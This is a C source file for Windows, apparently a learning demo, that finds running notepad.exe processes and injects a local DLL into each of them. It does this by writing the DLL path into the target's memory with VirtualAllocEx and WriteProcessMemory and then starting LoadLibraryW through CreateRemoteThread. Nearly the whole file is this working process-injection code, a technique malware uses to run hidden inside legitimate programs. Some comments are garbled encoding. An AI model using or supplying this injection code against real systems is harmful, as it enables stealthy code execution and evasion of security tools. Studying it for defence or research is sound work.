#include <stdio.h>

#include <Windows.h>

#include <tlhelp32.h>



DWORD demoCreateRemoteThreadW(PCWSTR pszLibFile, DWORD dwProcessId);

int main(int argc, char* argv[])

{

	HANDLE hProcessSnap;

	HANDLE hProcess;

	PROCESSENTRY32 pe32;

	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //�����н��̽��п���

	if (hProcessSnap == INVALID_HANDLE_VALUE)

		return(0);



	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32)) //�õ���һ�����̣���������Ϣ������pe32����ṹ����

	{

		CloseHandle(hProcessSnap);            // clean the snapshot object

		return(0);

	}

	do {

		if (lstrcmp(pe32.szExeFile, TEXT("notepad.exe")) == 0) {

			demoCreateRemoteThreadW(L"C:\\Users\\Lenovo\\source\\repos\\notepad_injector\\Debug\\baselib.dll", pe32.th32ProcessID);

		}

	} while (Process32Next(hProcessSnap, &pe32));//���±���һ������ �����򷵻�1��û�н������򷵻�0



	CloseHandle(hProcessSnap);

	system("pause");

	return 1;

}



DWORD demoCreateRemoteThreadW(PCWSTR pszLibFile, DWORD dwProcessId)

{

	// Calculate the number of bytes needed for the DLL's pathname

	DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);

	//Get process handle passing in the process ID

	HANDLE hProcess = OpenProcess(//��һ���Ѵ��ڵĽ��̶��󣬲����ؽ��̵ľ��

		PROCESS_QUERY_INFORMATION |

		PROCESS_CREATE_THREAD |

		PROCESS_VM_OPERATION |

		PROCESS_VM_WRITE,

		FALSE, dwProcessId);

	if (hProcess == NULL)

	{

		printf(TEXT("[-] Error: Could not open process for PID (%d).\n"), dwProcessId);

		return(1);

	}

	// Allocate space in the remote process for the pathnameָ�����̵������ַ�ռ��б����򿪱�һ������

	LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);

	if (pszLibFileRemote == NULL)//���䲻�ɹ�

	{

		printf(TEXT("[-] Error: Could not allocate memory inside PID (%d).\n"), dwProcessId);

		return(1);

	}

	// Copy the DLL's pathname to the remote process address space

	DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);

	//pszLibFileָ��Ҫд�����ݵ�ָ�룬�������dll�ľ���·��

	if (n == 0)

	{

		printf(TEXT("[-] Error: Could not write any bytes into the PID [%d] address space.\n"), dwProcessId);

		return(1);

	}

	// Get the real address of LoadLibraryW in Kernel32.dll

	PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");

	if (pfnThreadRtn == NULL)

	{

		printf(TEXT("[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n"));

		return(1);

	}

	// Create a remote thread that calls LoadLibraryW(DLLPathname)

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);

	//kernal32��loadlibrary������������dll��pszlibFileRemote����Ϊ������loadlibrary��

	if (hThread == NULL)

	{

		printf(TEXT("[-] Error: Could not create the Remote Thread.\n"));

		return(1);

	}

	else

		printf(TEXT("[+] Success: DLL injected via CreateRemoteThread().\n"));

	// Wait for the remote thread to terminate

	WaitForSingleObject(hThread, INFINITE);

	// Free the remote memory that contained the DLL's pathname and close Handles

	if (pszLibFileRemote != NULL)

		VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);

	if (hThread != NULL)

		CloseHandle(hThread);

	if (hProcess != NULL)

		CloseHandle(hProcess);

	return(0);

}